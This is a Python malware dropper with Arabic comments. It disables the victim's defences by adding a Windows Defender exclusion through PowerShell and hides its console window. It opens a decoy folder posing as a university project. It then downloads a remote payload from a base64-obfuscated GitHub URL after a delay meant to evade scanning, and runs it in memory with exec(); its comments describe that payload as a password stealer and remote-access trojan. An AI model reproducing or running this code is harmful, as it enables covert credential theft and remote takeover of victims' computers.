import requests
import base64
import time
import subprocess
import os
import sys

# إعدادات الصمت التام لضمان عدم ظهور أي نافذة CMD مريبة
si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = 0


def execute_payload():
    # الرابط بتاعك اللي بعته، مشفر بـ Base64 عشان الـ Firewall ميشكش في GitHub
    encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2IxZG80MDQvTXktUHl0aG9uLVByYWN0aXNlL3JlZnMvaGVhZHMvbWFpbi90ZXN0L3JhdyUyMHRleHQ="

    try:
        url = base64.b64decode(encoded_url).decode()

        # 1. فترة انتظار تكتيكية (15 ثانية) لتجاوز الفحص السلوكي الأولي
        time.sleep(15)

        # 2. تحميل البايلود التقيل (سحب الباسوردات والـ RAT) في الرام مباشرة
        r = requests.get(url, timeout=20)
        if r.status_code == 200:
            # 3. التشغيل بدون لمس الهارد (Memory-only execution)
            # دي أقوى خدعة لتجنب الـ Disk Scanning
            exec(r.text, globals())
    except:
        pass


if __name__ == "__main__":
    # التمويه بفتح فولدر المشروع بكرة في جامعة الإسكندرية
    if os.path.exists("very  Important"):
        os.startfile("very  Important")

    # محاولة كسر الحماية استباقياً (Exclusion Injection)
    try:
        curr = sys.executable
        subprocess.run(
            f"powershell -Command \"Add-MpPreference -ExclusionPath '{curr}'\"",
            shell=True,
            startupinfo=si,
        )
    except:
        pass

    execute_payload()
